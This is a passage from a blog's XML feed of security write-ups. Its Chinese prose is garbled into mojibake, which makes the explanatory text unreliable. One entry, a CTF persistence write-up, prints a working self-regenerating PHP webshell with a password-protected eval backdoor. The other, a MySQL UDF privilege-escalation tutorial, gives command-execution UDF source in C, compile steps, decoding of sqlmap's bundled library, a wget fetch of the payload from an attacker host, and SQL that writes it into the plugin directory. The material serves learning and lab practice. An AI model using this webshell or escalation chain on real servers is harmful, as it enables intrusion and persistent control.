rceåˆ†æåˆé›†</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç„æœºç¬¬ä¸‰ç« -linuxæƒé™ç»´æŒ-éšè—</title>
      <link href="/2024/11/28/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%89%E7%AB%A0-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/"/>
      <url>/2024/11/28/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%89%E7%AB%A0-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç„æœº </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æƒé™ç»´æŒ</title>
      <link href="/2024/11/26/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2024/11/26/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆï¼Œå¹²è„†ç©ç©ç»´æƒå§ã€‚"><a href="#ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆï¼Œå¹²è„†ç©ç©ç»´æƒå§ã€‚" class="headerlink" title="ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆï¼Œå¹²è„†ç©ç©ç»´æƒå§ã€‚"></a>ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆï¼Œå¹²è„†ç©ç©ç»´æƒå§ã€‚</h1><h1 id="web670"><a href="#web670" class="headerlink" title="web670"></a>web670</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://checker/api/check&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;params not validate&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡å°è¯•åå‘ç°å…¶åœ¨checkåä¼šåˆ æ–‡ä»¶ã€‚</p><p>è€Œæƒ³åˆ°å¯¹æŠ—æ–¹æ³•å½“ç„¶å°±æ˜¯å†…å­˜é©¬äº†ï¼Œäºæ˜¯æˆ‘åœ¨ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸€ä¸ªå†…å­˜é©¬<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);<span class="comment">//å…è®¸è„šæœ¬å†å®¢æˆ·ç«¯æ–­å¼€åè¿›è¡Œè¿è¡Œ</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„å†…å­˜é©¬åªè¦ä¸Šä¼ åè®¿é—®å…¶webé¡µé¢å°±ä¼šè‡ªåˆ ä¸”ä¸æ–­ç”Ÿæˆé©¬</p><img src="/2024/11/26/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/IMG_20241126-233106585.png" class="">  <p>è¿ä¸Šä¸æ­»é©¬åå‘ç°å…¶å¹¶æ²¡æœ‰åˆ é™¤æ‰€æœ‰æ–‡ä»¶ï¼Œåªåˆ é™¤äº†phpæ–‡ä»¶</p><img src="/2024/11/26/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/IMG_20241126-233207555.png" class="">  <h2 id="å†…å­˜é©¬å¯¹æŠ—æ–¹æ³•"><a href="#å†…å­˜é©¬å¯¹æŠ—æ–¹æ³•" class="headerlink" title="å†…å­˜é©¬å¯¹æŠ—æ–¹æ³•"></a>å†…å­˜é©¬å¯¹æŠ—æ–¹æ³•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;hi springbird !&#x27;</span>;</span><br><span class="line">    <span class="comment">//pass=pass</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">    <span class="comment">//    usleep(5000);</span></span><br><span class="line">          <span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„è„šæœ¬æ¥å¯¹ä¸æ­»é©¬è¿›è¡Œç«äº‰å› ä¸ºè„šæœ¬çš„è¿è¡Œé€Ÿåº¦æ¯”å†…å­˜é©¬å¿«æ‰€æœ‰ä¼šå°†ä¸æ­»é©¬çš„æ–‡ä»¶è¦†ç›–</p><h1 id="web671"><a href="#web671" class="headerlink" title="web671"></a>web671</h1><p>åŒæ ·å†…å­˜é©¬</p><img src="/2024/11/26/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/IMG_20241126-234904356.png" class="">  <h1 id="web671å’Œ676éƒ½æ˜¯å†…å­˜é©¬æˆ‘ç›´æ¥è·³è¿‡"><a href="#web671å’Œ676éƒ½æ˜¯å†…å­˜é©¬æˆ‘ç›´æ¥è·³è¿‡" class="headerlink" title="web671å’Œ676éƒ½æ˜¯å†…å­˜é©¬æˆ‘ç›´æ¥è·³è¿‡"></a>web671å’Œ676éƒ½æ˜¯å†…å­˜é©¬æˆ‘ç›´æ¥è·³è¿‡</h1><h1 id="web677"><a href="#web677" class="headerlink" title="web677"></a>web677</h1><img src="/2024/11/26/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/IMG_20241126-235600593.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°webé¡µé¢æ˜¯ä¸å¯å†™çš„</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql:udfææƒ</title>
      <link href="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/"/>
      <url>/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="æ‰“ç„æœºçš„æ—¶å€™é‡åˆ°äº†mysqlçš„æ—¥å¿—å®¡æŸ¥ï¼Œè€Œæˆ‘æœ¬äººå¯¹äºææƒæ“ä½œå…¶å®å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£ã€‚æœ¬æ–‡å°†è®°å½•mysqlçš„udfææƒçš„å­¦ä¹ "><a href="#æ‰“ç„æœºçš„æ—¶å€™é‡åˆ°äº†mysqlçš„æ—¥å¿—å®¡æŸ¥ï¼Œè€Œæˆ‘æœ¬äººå¯¹äºææƒæ“ä½œå…¶å®å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£ã€‚æœ¬æ–‡å°†è®°å½•mysqlçš„udfææƒçš„å­¦ä¹ " class="headerlink" title="æ‰“ç„æœºçš„æ—¶å€™é‡åˆ°äº†mysqlçš„æ—¥å¿—å®¡æŸ¥ï¼Œè€Œæˆ‘æœ¬äººå¯¹äºææƒæ“ä½œå…¶å®å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£ã€‚æœ¬æ–‡å°†è®°å½•mysqlçš„udfææƒçš„å­¦ä¹ "></a>æ‰“ç„æœºçš„æ—¶å€™é‡åˆ°äº†mysqlçš„æ—¥å¿—å®¡æŸ¥ï¼Œè€Œæˆ‘æœ¬äººå¯¹äºææƒæ“ä½œå…¶å®å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£ã€‚æœ¬æ–‡å°†è®°å½•mysqlçš„udfææƒçš„å­¦ä¹ </h1><h1 id="ä»€ä¹ˆæ˜¯udf"><a href="#ä»€ä¹ˆæ˜¯udf" class="headerlink" title="ä»€ä¹ˆæ˜¯udf"></a>ä»€ä¹ˆæ˜¯udf</h1><p>udfçš„å…¨ç§°ä¸ºUser Defined Functionï¼Œæ˜¯mysqlä¸ºäº†æ‹“å±•è‡ªå·±çš„çµæ´»æ€§å‡ºçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…¶å…è®¸ç”¨æˆ·é€šè¿‡åŠ¨æ€é“¾æ¥åº“æ¥è‡ªå®šä¹‰functionã€‚</p><h2 id="åˆ›å»ºä¸ä½¿ç”¨"><a href="#åˆ›å»ºä¸ä½¿ç”¨" class="headerlink" title="åˆ›å»ºä¸ä½¿ç”¨"></a>åˆ›å»ºä¸ä½¿ç”¨</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="operator">&lt;</span>function_name<span class="operator">&gt;</span> <span class="keyword">RETURNS</span> <span class="operator">&lt;</span>return_type<span class="operator">&gt;</span> SONAME <span class="string">&#x27;&lt;library_name&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºçš„function_nameå¿…é¡»æ˜¯æˆ‘ä»¬soæ–‡ä»¶åœ¨ç¼–è¯‘å‰çš„cæ–‡ä»¶å†…å£°æ˜è¿‡çš„ã€‚<br>ä¸”soæ–‡ä»¶å¿…é¡»åœ¨pluginè·¯å¾„ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹è·¯å¾„æ¥æŸ¥è¯¢pluginè·¯å¾„<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&quot;%plugin%&quot;</span>;</span><br></pre></td></tr></table></figure></p><p>è°ƒç”¨<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span>function_name<span class="operator">&gt;</span>(<span class="operator">&lt;</span>parameters<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ¥è‡ªå®šä¹‰åˆ›å»ºæˆ‘ä»¬æ‰€éœ€çš„soæ–‡ä»¶<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/mysql.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">my_bool <span class="title function_">lse_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *message)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">lse</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *result, <span class="type">unsigned</span> <span class="type">long</span> *length, <span class="type">char</span> *is_null, <span class="type">char</span> *error)</span> &#123;</span><br><span class="line">    <span class="comment">// Example: Execute system command</span></span><br><span class="line">    FILE *fp = popen(args-&gt;args[<span class="number">0</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    fread(result, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line">    *length = <span class="built_in">strlen</span>(result);</span><br><span class="line">    pclose(fp);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„cæ–‡ä»¶çš„å£°æ˜çš„æ–¹æ³•åå°±ä¸ºlseã€‚åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤æ¥ç¼–è¯‘<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o lse.so -fPIC evl.c -I/usr/include/mariadb</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯ä¸Šé¢çš„ç¼–è¯‘è¿‡ç¨‹éœ€è¦ç”¨åˆ°mysqlåº“ï¼Œä½†æ˜¯æœ‰çš„æœºå­æ˜¯æ²¡æœ‰åŠ¨è°ƒé“¾æ¥åº“çš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ¥é¿å…ä½¿ç”¨mysqlåº“<br><a href="https://blog.csdn.net/Bossfrank/article/details/131424479?spm=1001.2014.3001.5502">æ¸—é€æµ‹è¯•ï¼šMySQLæ•°æ®åº“UDFææƒè¯¦è§£</a><br><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-114235157.png" class="">  </p><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-114609589.png" class="">  <p>åˆ©ç”¨<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql udf -m 1518</span><br></pre></td></tr></table></figure><br>æ¥å¤åˆ¶1518.cæ–‡ä»¶<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv 1518.c raptor_udf2.c</span><br><span class="line">gcc -g -c raptor_udf2.c -fPIC</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>åŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹cæ–‡ä»¶æ¥ä¿®æ”¹å£°æ˜å‡½æ•°å</p><p>å½“ç„¶è¿™æ ·è¿˜æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»sqlmapé‡Œæ‹¿å–ç°æˆçš„soæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶åˆ†ä¸ºlinuxå’Œwinçš„32ä½å’Œ64ä½</p><p>åœ¨å¦‚ä¸‹ä½ç½®<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/sqlmap/data/udf/mysql/</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯sqlmapé‡Œçš„æ–‡ä»¶éƒ½æ˜¯ç»è¿‡ç¼–ç çš„æˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶è‡ªå¸¦çš„è„šæœ¬æ¥è§£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i ./linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">â”€$ nm -D lib_mysqludf_sys.so</span><br><span class="line">0000000000201788 A __bss_start</span><br><span class="line">                 w __cxa_finalize@GLIBC_2.2.5</span><br><span class="line">0000000000201788 A _edata</span><br><span class="line">0000000000201798 A _end</span><br><span class="line">                 U fgets@GLIBC_2.2.5</span><br><span class="line">0000000000001178 T _fini</span><br><span class="line">                 U fork@GLIBC_2.2.5</span><br><span class="line">                 U free@GLIBC_2.2.5</span><br><span class="line">                 U getenv@GLIBC_2.2.5</span><br><span class="line">                 w __gmon_start__</span><br><span class="line">0000000000000ba0 T _init</span><br><span class="line">                 w _Jv_RegisterClasses</span><br><span class="line">000000000000101a T lib_mysqludf_sys_info</span><br><span class="line">0000000000000da4 T lib_mysqludf_sys_info_deinit</span><br><span class="line">0000000000001047 T lib_mysqludf_sys_info_init</span><br><span class="line">                 U malloc@GLIBC_2.2.5</span><br><span class="line">                 U mmap@GLIBC_2.2.5</span><br><span class="line">                 U pclose@GLIBC_2.2.5</span><br><span class="line">                 U popen@GLIBC_2.2.5</span><br><span class="line">                 U realloc@GLIBC_2.2.5</span><br><span class="line">                 U setenv@GLIBC_2.2.5</span><br><span class="line">                 U strcpy@GLIBC_2.2.5</span><br><span class="line">                 U strncpy@GLIBC_2.2.5</span><br><span class="line">0000000000000dac T sys_bineval</span><br><span class="line">0000000000000dab T sys_bineval_deinit</span><br><span class="line">0000000000000da8 T sys_bineval_init</span><br><span class="line">                 U sysconf@GLIBC_2.2.5</span><br><span class="line">0000000000000e46 T sys_eval</span><br><span class="line">0000000000000da7 T sys_eval_deinit</span><br><span class="line">0000000000000f2e T sys_eval_init</span><br><span class="line">0000000000001066 T sys_exec</span><br><span class="line">0000000000000da6 T sys_exec_deinit</span><br><span class="line">0000000000000f57 T sys_exec_init</span><br><span class="line">00000000000010f7 T sys_get</span><br><span class="line">0000000000000da5 T sys_get_deinit</span><br><span class="line">0000000000000fea T sys_get_init</span><br><span class="line">000000000000107a T sys_set</span><br><span class="line">00000000000010e8 T sys_set_deinit</span><br><span class="line">0000000000000f80 T sys_set_init</span><br><span class="line">                 U system@GLIBC_2.2.5</span><br><span class="line">                 U waitpid@GLIBC_2.2.5</span><br><span class="line">                                      </span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šé¢çš„å‡½æ•°åˆ—è¡¨æˆ‘ä»¬çŸ¥é“äº†è¯¥soæ–‡ä»¶å£°æ˜äº†sys_eval,sys_exec,sys_get,sys_set,sys_bineval<br>æ¥ä¸‹æ¥çš„ææƒæ¼”ç¤ºæˆ‘éƒ½ä¼šä½¿ç”¨sqlmapçš„soæ–‡ä»¶æ¥æ¼”ç¤º</p><h1 id="åå¼¹shellåçš„ææƒæ“ä½œ"><a href="#åå¼¹shellåçš„ææƒæ“ä½œ" class="headerlink" title="åå¼¹shellåçš„ææƒæ“ä½œ"></a>åå¼¹shellåçš„ææƒæ“ä½œ</h1><p>æˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨æœ¬åœ°çš„kaliæ¥åå¼¹shellæ¨¡æ‹Ÿä¸€ä¸ªæ‹¿åˆ°shellåçš„ææƒæ“ä½œ</p><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-121206343.png" class="">  <p>é¦–å…ˆæˆ‘ä»¬ä¼šå‘ç°å¼¹å‡ºçš„shelläº¤äº’æ€§å¾ˆå·®ï¼Œæ— æ³•æ”¯æŒæˆ‘ä»¬è¿›è¡Œmysqlçš„é“¾æ¥ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹pythonå‘½ä»¤æ¥æé«˜shellçš„äº¤äº’æ€§</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‘½ä»¤ä½¿ç”¨äº†pythonè‡ªå¸¦çš„ptyæ¥æé«˜äº¤äº’æ€§</p><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-121515239.png" class="">  <h2 id="æ£€æŸ¥mysqlæ˜¯å¦å…è®¸å¯¼å…¥å¯¼å‡ºæ–‡ä»¶"><a href="#æ£€æŸ¥mysqlæ˜¯å¦å…è®¸å¯¼å…¥å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="æ£€æŸ¥mysqlæ˜¯å¦å…è®¸å¯¼å…¥å¯¼å‡ºæ–‡ä»¶"></a>æ£€æŸ¥mysqlæ˜¯å¦å…è®¸å¯¼å…¥å¯¼å‡ºæ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure_file_priv%&quot;;</span><br></pre></td></tr></table></figure><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-121620819.png" class="">  <p>å½“secure_file_privä¸ºå®šä¹‰å€¼æ—¶ä»£è¡¨ä½¿ç”¨ç›®å½•ä¸‹éƒ½å¯å¯¼å…¥ï¼Œå¦‚æœæŒ‡å®šäº†ç›®å½•ä»£è¡¨åªèƒ½åœ¨è¯¥ç›®å½•ä¸‹å¯¼å…¥å¯¼å‡ºï¼Œå¦‚æœä¸ºnullä»£è¡¨ä¸å…è®¸å¯¼å…¥å¯¼å‡ºæ“ä½œ<br>éœ€è¦è¿™ä¸ªæƒé™çš„åŸå› æ˜¯udfææƒéœ€è¦å°†soæ–‡ä»¶ä¼ åˆ°pluginç›®å½•ä¸‹ä½†æ˜¯è¯¥ç›®å½•çš„ä¼ å…¥éœ€è¦rootæƒé™ï¼Œæ‰€æœ‰æˆ‘ä»¬åªèƒ½ä½¿ç”¨å…·æœ‰rootæƒé™çš„mysqlæ¥å¯¼å…¥</p><h2 id="æŸ¥çœ‹æƒé™"><a href="#æŸ¥çœ‹æƒé™" class="headerlink" title="æŸ¥çœ‹æƒé™"></a>æŸ¥çœ‹æƒé™</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1) ;</span><br></pre></td></tr></table></figure><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-122115638.png" class="">  <h2 id="æŸ¥æ‰¾pluginè·¯å¾„"><a href="#æŸ¥æ‰¾pluginè·¯å¾„" class="headerlink" title="æŸ¥æ‰¾pluginè·¯å¾„"></a>æŸ¥æ‰¾pluginè·¯å¾„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-122134177.png" class="">  <p>/usr/lib/mysql/plugin/</p><h2 id="æŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬"><a href="#æŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬"></a>æŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;version_compile_%&#x27;;</span><br></pre></td></tr></table></figure><h2 id="ä¸‹è½½soæ–‡ä»¶"><a href="#ä¸‹è½½soæ–‡ä»¶" class="headerlink" title="ä¸‹è½½soæ–‡ä»¶"></a>ä¸‹è½½soæ–‡ä»¶</h2><p>æˆ‘ä»¬ç›´æ¥è¿œç¨‹ä¸‹è½½udfæ–‡ä»¶<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip:8000/udf.zip</span><br></pre></td></tr></table></figure></p><h2 id="å°†udfå¯¼å…¥pluginè·¯å¾„è¿›è¡Œææƒ"><a href="#å°†udfå¯¼å…¥pluginè·¯å¾„è¿›è¡Œææƒ" class="headerlink" title="å°†udfå¯¼å…¥pluginè·¯å¾„è¿›è¡Œææƒ"></a>å°†udfå¯¼å…¥pluginè·¯å¾„è¿›è¡Œææƒ</h2><p>ä½¿ç”¨å¦‚ä¸‹ç›®å‘½ä»¤å°†ä¸‹è½½çš„udfæ–‡ä»¶å†™å…¥pluginæ–‡ä»¶å¤¹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/tmp/udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;) into dumpfile &#x27;/usr/lib/mysql/plugin/eval.so&#x27;;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-144503781.png" class="">  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;eval.so&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-145359790.png" class="">  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 